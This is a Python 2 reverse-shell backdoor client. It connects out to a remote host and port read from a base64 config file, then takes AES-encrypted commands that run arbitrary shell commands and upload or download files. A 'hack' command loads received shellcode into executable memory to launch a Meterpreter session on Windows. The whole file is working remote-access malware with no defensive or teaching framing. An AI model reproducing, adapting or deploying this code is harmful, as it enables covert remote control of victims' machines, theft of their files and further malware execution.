#!/usr/bin/python

import socket, subprocess, sys, os
import pickle
from Crypto.Cipher import AES
import base64
import ctypes
import pdb
BLOCK_SIZE = 32  # Bytes
unpad = lambda s: s[:-ord(s[len(s) - 1:])]
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

# READ CONFIG IN BASE 64
file = open("./config", "r")
config = file.read()
config = base64.b64decode(config)
config = config.split(",")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.connect((config[0], int(config[1])))




def do_encrypt(message):
    raw = pad(message)
    obj = AES.new(config[2], AES.MODE_ECB)
    ciphertext = obj.encrypt(raw)
    return ciphertext

def do_decrypt(ciphertext):
    obj2 = AES.new('This_is_a_key123', AES.MODE_ECB)
    message = obj2.decrypt(ciphertext)
    return unpad(message)

def open_meterpreter(shellcode):
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0),
                                             ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


while True :
    encrypt = s.recv(10000)
    command = do_decrypt(encrypt)
    print command
    if command == 'quit' :
        break
    elif "download" in command:
        isFirst = False
        a = command.replace("download", "")
        a = a.replace(" ", "")
        with open( a, 'rb') as f:
            l = f.read(350000)
            l  = do_encrypt(l)
            s.send(l)
    elif 'upload' in command:
        a = command.replace("upload", "")
        a = a.replace(" ", "")
        with open(a+ "_uploaded" , 'wb') as f:
            buf = s.recv(35000)
            buf = do_decrypt(buf)
            f.write(buf)
    elif "hack" in command:
        buf = s.recv(10000)
        #buf = do_decrypt(buf)
        open_meterpreter(bytearray(buf))
        print "sigue"
    else:
        reply = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = reply.communicate()
        en_reply = do_encrypt(stdout)
        s.send(en_reply)

s.close()
